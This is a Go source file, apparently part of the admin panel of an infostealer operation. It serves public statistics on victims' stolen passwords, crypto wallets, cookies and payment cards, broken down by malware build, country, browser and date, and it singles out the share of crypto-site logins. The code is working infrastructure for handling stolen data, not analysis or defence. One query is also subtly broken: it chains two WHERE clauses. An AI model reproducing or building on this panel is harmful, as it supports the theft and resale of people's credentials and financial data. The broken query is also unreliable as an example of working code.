package api

import (
	"database/sql"
	"net/http"
	"zialfi-panel/internal/db"
)

type PublicStatsHandler struct {
	db *sql.DB
	provider db.ProviderType
}

func NewPublicStatsHandler(db *sql.DB, provider db.ProviderType) *PublicStatsHandler {
	return &PublicStatsHandler{db: db, provider: provider}
}

type PublicStatsResponse struct {
	TotalSessions  int           `json:"total_sessions"`
	TodaySessions  int           `json:"today_sessions"`
	TotalPasswords int           `json:"total_passwords"`
	TotalWallets   int           `json:"total_wallets"`
	TotalCookies   int           `json:"total_cookies"`
	TotalCards     int           `json:"total_cards"`
	CryptoLogsPct  float64       `json:"crypto_logs_pct"`
	DuplicatesPct  float64       `json:"duplicates_pct"`
	CountryDist    []CountryStat `json:"country_distribution"`
	BrowserDist    []BrowserStat `json:"browser_distribution"`
	Timeline       []DayStat     `json:"timeline"`
}

type CountryStat struct {
	Country string `json:"country"`
	Count   int    `json:"count"`
}

type BrowserStat struct {
	Browser string `json:"browser"`
	Count   int    `json:"count"`
}

type DayStat struct {
	Date  string `json:"date"`
	Count int    `json:"count"`
}

func (h *PublicStatsHandler) GetPublicStats(w http.ResponseWriter, r *http.Request) {
	var enabled string
	err := db.QueryRow(h.db, h.provider, "SELECT value FROM settings WHERE key = 'public_stats_enabled'").Scan(&enabled)
	if err != nil || enabled != "true" {
		writeError(w, http.StatusNotFound, "public stats not available")
		return
	}

	tag := r.URL.Query().Get("tag")
	if tag == "" {
		db.QueryRow(h.db, h.provider, "SELECT value FROM settings WHERE key = 'public_stats_tag'").Scan(&tag)
	}

	where := ""
	args := []any{}
	if tag != "" {
		where = " WHERE build_id IN (SELECT id FROM builds WHERE build_tag = ?)"
		args = append(args, tag)
	}

	resp := PublicStatsResponse{
		CountryDist: []CountryStat{},
		BrowserDist: []BrowserStat{},
		Timeline:    []DayStat{},
	}

	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM sessions"+where, args...).Scan(&resp.TotalSessions)
	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM sessions WHERE date(created_at) = date('now')"+where, args...).Scan(&resp.TodaySessions)

	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM passwords").Scan(&resp.TotalPasswords)
	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM wallets").Scan(&resp.TotalWallets)
	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cookies").Scan(&resp.TotalCookies)
	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cards").Scan(&resp.TotalCards)

	allPwCount := resp.TotalPasswords
	cryptoRows, _ := db.Query(h.db, h.provider, "SELECT COUNT(*) FROM passwords WHERE url LIKE '%blockchain%' OR url LIKE '%wallet%' OR url LIKE '%coinbase%' OR url LIKE '%binance%' OR url LIKE '%metamask%'")
	if cryptoRows != nil {
		defer cryptoRows.Close()
		if cryptoRows.Next() {
			var n int
			cryptoRows.Scan(&n)
			if allPwCount > 0 {
				resp.CryptoLogsPct = float64(n) / float64(allPwCount) * 100
			}
		}
	}

	if resp.TotalSessions > 0 {
		var dup int
		db.QueryRow(h.db, h.provider, "SELECT COUNT(*) - COUNT(DISTINCT hwid) FROM sessions WHERE hwid != ''").Scan(&dup)
		resp.DuplicatesPct = float64(dup) / float64(resp.TotalSessions) * 100
	}

	rows, err := db.Query(h.db, h.provider, "SELECT country_code, COUNT(*) as c FROM sessions WHERE country_code != '' GROUP BY country_code ORDER BY c DESC LIMIT 20")
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			var e CountryStat
			if rows.Scan(&e.Country, &e.Count) == nil {
				resp.CountryDist = append(resp.CountryDist, e)
			}
		}
	}

	rows2, err := db.Query(h.db, h.provider, "SELECT browser, COUNT(*) as c FROM passwords WHERE browser != '' GROUP BY browser ORDER BY c DESC")
	if err == nil {
		defer rows2.Close()
		for rows2.Next() {
			var e BrowserStat
			if rows2.Scan(&e.Browser, &e.Count) == nil {
				resp.BrowserDist = append(resp.BrowserDist, e)
			}
		}
	}

	rows3, err := db.Query(h.db, h.provider, "SELECT date(created_at) as d, COUNT(*) FROM sessions WHERE created_at >= datetime('now', '-30 days') GROUP BY d ORDER BY d")
	if err == nil {
		defer rows3.Close()
		for rows3.Next() {
			var e DayStat
			if rows3.Scan(&e.Date, &e.Count) == nil {
				resp.Timeline = append(resp.Timeline, e)
			}
		}
	}

	writeJSON(w, http.StatusOK, resp)
}
